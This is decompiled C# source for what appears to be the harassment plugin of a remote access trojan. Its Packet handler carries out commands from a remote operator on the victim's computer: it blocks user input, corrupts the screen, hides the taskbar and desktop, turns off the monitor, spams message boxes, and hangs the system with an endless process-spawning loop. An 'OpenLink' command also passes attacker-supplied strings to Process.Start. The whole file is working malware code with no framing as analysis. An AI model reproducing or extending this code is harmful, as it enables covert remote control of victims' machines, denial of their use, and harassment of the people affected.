using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using Leb128;
using Plugin.Handler;
using Plugin.Handler.GDI;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static CancellationTokenSource CancellationToken = new CancellationTokenSource();

	public static void Read(byte[] data)
	{
		try
		{
			object[] objects = LEB128.Read(data);
			new Thread((ThreadStart)delegate
			{
				//IL_088b: Unknown result type (might be due to invalid IL or missing references)
				string text = (string)objects[0];
				if (text != null)
				{
					switch (text.Length)
					{
					case 11:
						switch (text[0])
						{
						case 'F':
							if (!(text == "FuckScreen+"))
							{
								if (text == "FuckScreen-")
								{
									HandleFuckScreen.Stop();
								}
							}
							else
							{
								HandleFuckScreen.Start();
							}
							break;
						case 'b':
							if (!(text == "blockInput+"))
							{
								if (text == "blockInput-")
								{
									Native.BlockInput(fBlockIt: false);
								}
							}
							else
							{
								Native.BlockInput(fBlockIt: true);
							}
							break;
						case 'S':
							if (text == "ScreenColor")
							{
								HandleScreenColors.Screen((string)objects[1]);
							}
							break;
						}
						break;
					case 8:
						switch (text[0])
						{
						case 'O':
							if (text == "OpenLink")
							{
								Process.Start((string)objects[1]);
							}
							break;
						case 'E':
							if (text == "Explorer")
							{
								Process.Start("Explorer.exe");
							}
							break;
						case 'T':
							if (!(text == "Taskbar+"))
							{
								if (text == "Taskbar-")
								{
									new HandleTaskbar().Hide();
								}
							}
							else
							{
								new HandleTaskbar().Show();
							}
							break;
						case 'D':
							if (!(text == "Desktop+"))
							{
								if (text == "Desktop-")
								{
									new HandleDesktop().Hide();
								}
							}
							else
							{
								new HandleDesktop().Show();
							}
							break;
						case 'S':
							if (!(text == "Stripes+"))
							{
								if (text == "Stripes-")
								{
									HandleStripes.Stop();
								}
							}
							else
							{
								HandleStripes.Start();
							}
							break;
						}
						break;
					case 4:
						switch (text[0])
						{
						case 'C':
							if (text == "Calc")
							{
								Process.Start("Calc.exe");
							}
							break;
						case 'L':
							if (!(text == "Led+"))
							{
								if (text == "Led-")
								{
									HandleLed.Stop();
								}
							}
							else
							{
								HandleLed.Start();
							}
							break;
						case 'W':
							if (!(text == "Wef+"))
							{
								if (text == "Wef-")
								{
									HandleWef.Stop();
								}
							}
							else
							{
								HandleWef.Start();
							}
							break;
						}
						break;
					case 10:
						switch (text[4])
						{
						case 'r':
							if (text == "Powershell")
							{
								Process.Start("Powershell.exe");
							}
							break;
						case 'M':
							if (!(text == "holdMouse+"))
							{
								if (text == "holdMouse-")
								{
									HandleHoldMouse.Stop();
								}
							}
							else
							{
								HandleHoldMouse.Hold();
							}
							break;
						case 't':
							if (text == "monitorOff")
							{
								new HandleMonitor().TurnOff();
							}
							break;
						case 'S':
							if (text == "hangSystem")
							{
								while (true)
								{
									string[] array = new string[7] { "cmd.exe", "calc.exe", "notepad.exe", "word.exe", "Paint.exe", "powershell.exe", "Explorer.exe" };
									foreach (string fileName in array)
									{
										try
										{
											Process.Start(fileName);
										}
										catch
										{
										}
									}
								}
							}
							break;
						case 'a':
							if (text == "MessageBox")
							{
								MessageBox.Show((string)objects[1], (string)objects[2], (MessageBoxButtons)(byte)objects[3], (MessageBoxIcon)(byte)objects[4]);
							}
							break;
						case 'w':
							if (!(text == "Sinewaves+"))
							{
								if (text == "Sinewaves-")
								{
									HandleSinewaves.Stop();
								}
							}
							else
							{
								HandleSinewaves.Start();
							}
							break;
						}
						break;
					case 7:
						switch (text[5])
						{
						case 'a':
							if (text == "Notepad")
							{
								Process.Start("Notepad.exe");
							}
							break;
						case 'g':
							if (text == "Taskmgr")
							{
								Process.Start("Taskmgr.exe");
							}
							break;
						case 'n':
							if (text == "ScreenS")
							{
								new HandleRotation().Rotation((string)objects[1]);
							}
							break;
						case 'D':
							switch (text)
							{
							case "openCD+":
								new HandleOpenCD().Show();
								break;
							case "openCD-":
								new HandleOpenCD().Hide();
								break;
							case "DumpVD+":
								HandleDumpVD.Start();
								break;
							case "DumpVD-":
								HandleDumpVD.Stop();
								break;
							}
							break;
						case '3':
							if (!(text == "Train3+"))
							{
								if (text == "Train3-")
								{
									HandleTrain3.Stop();
								}
							}
							else
							{
								HandleTrain3.Start();
							}
							break;
						case '2':
							if (!(text == "Train2+"))
							{
								if (text == "Train2-")
								{
									HandleTrain2.Stop();
								}
							}
							else
							{
								HandleTrain2.Start();
							}
							break;
						case '1':
							if (!(text == "Train1+"))
							{
								if (text == "Train1-")
								{
									HandleTrain1.Stop();
								}
							}
							else
							{
								HandleTrain1.Start();
							}
							break;
						case 'l':
							if (!(text == "Tunnel+"))
							{
								if (text == "Tunnel-")
								{
									HandleTunnel.Stop();
								}
							}
							else
							{
								HandleTunnel.Start();
							}
							break;
						}
						break;
					case 12:
						switch (text[6])
						{
						case 'c':
							if (!(text == "blankscreen+"))
							{
								if (text == "blankscreen-")
								{
									new HandleBlankScreen().Stop();
								}
							}
							else
							{
								new HandleBlankScreen().Run();
							}
							break;
						case 'S':
							if (!(text == "InvertSmelt+"))
							{
								if (text == "InvertSmelt-")
								{
									HandleInvertSmelt.Stop();
								}
							}
							else
							{
								HandleInvertSmelt.Start();
							}
							break;
						case 'C':
							if (!(text == "InvertColor+"))
							{
								if (text == "InvertColor-")
								{
									HandleInvertColor.Stop();
								}
							}
							else
							{
								HandleInvertColor.Start();
							}
							break;
						}
						break;
					case 9:
						switch (text[0])
						{
						case 'p':
							if (text == "playAudio")
							{
								new HandlePlayAudio().Play((byte[])objects[1]);
							}
							break;
						case 'K':
							if (!(text == "Keyboard+"))
							{
								if (text == "Keyboard-")
								{
									HandleKeyBoard.Stop();
								}
							}
							else
							{
								HandleKeyBoard.Start();
							}
							break;
						case 'S':
							if (!(text == "Setpixel+"))
							{
								if (text == "Setpixel-")
								{
									HandleSetpixel.Stop();
								}
							}
							else
							{
								HandleSetpixel.Start();
							}
							break;
						case 'R':
							if (!(text == "Rgbtrain+"))
							{
								if (text == "Rgbtrain-")
								{
									HandleRgbtrain.Stop();
								}
							}
							else
							{
								HandleRgbtrain.Start();
							}
							break;
						}
						break;
					case 15:
						switch (text[14])
						{
						case '+':
							if (text == "MessageBoxSpam+")
							{
								CancellationToken = new CancellationTokenSource();
								while (!CancellationToken.IsCancellationRequested)
								{
									new Thread((ThreadStart)delegate
									{
										//IL_0034: Unknown result type (might be due to invalid IL or missing references)
										MessageBox.Show((string)objects[1], (string)objects[2], (MessageBoxButtons)(byte)objects[3], (MessageBoxIcon)(byte)objects[4]);
									}).Start();
									Thread.Sleep(50);
								}
							}
							break;
						case '-':
							if (text == "MessageBoxSpam-")
							{
								CancellationToken.Cancel();
							}
							break;
						}
						break;
					case 5:
						switch (text[0])
						{
						case 'W':
							if (!(text == "Wide+"))
							{
								if (text == "Wide-")
								{
									HandleWide.Stop();
								}
							}
							else
							{
								HandleWide.Start();
							}
							break;
						case 'D':
							if (!(text == "Dark+"))
							{
								if (text == "Dark-")
								{
									HandleDark.Stop();
								}
							}
							else
							{
								HandleDark.Start();
							}
							break;
						}
						break;
					case 13:
						switch (text[12])
						{
						case '+':
							if (text == "VerticalWide+")
							{
								HandleVerticalWide.Start();
							}
							break;
						case '-':
							if (text == "VerticalWide-")
							{
								HandleVerticalWide.Stop();
							}
							break;
						}
						break;
					case 6:
						switch (text[1])
						{
						case 'm':
							if (!(text == "Smelt+"))
							{
								if (text == "Smelt-")
								{
									HandleSmelt.Stop();
								}
							}
							else
							{
								HandleSmelt.Start();
							}
							break;
						case 'h':
							if (!(text == "Shake+"))
							{
								if (text == "Shake-")
								{
									HandleShake.Stop();
								}
							}
							else
							{
								HandleShake.Start();
							}
							break;
						}
						break;
					case 3:
						if (text == "Cmd")
						{
							Process.Start("Cmd.exe");
						}
						break;
					case 16:
						if (text == "swapMouseButtons")
						{
							new HandleMouseButton().SwapMouseButtons();
						}
						break;
					case 19:
						if (text == "restoreMouseButtons")
						{
							new HandleMouseButton().RestoreMouseButtons();
						}
						break;
					case 14:
					case 17:
					case 18:
						break;
					}
				}
			}).Start();
		}
		catch (Exception ex)
		{
			Client.Error(ex.ToString());
		}
	}
}
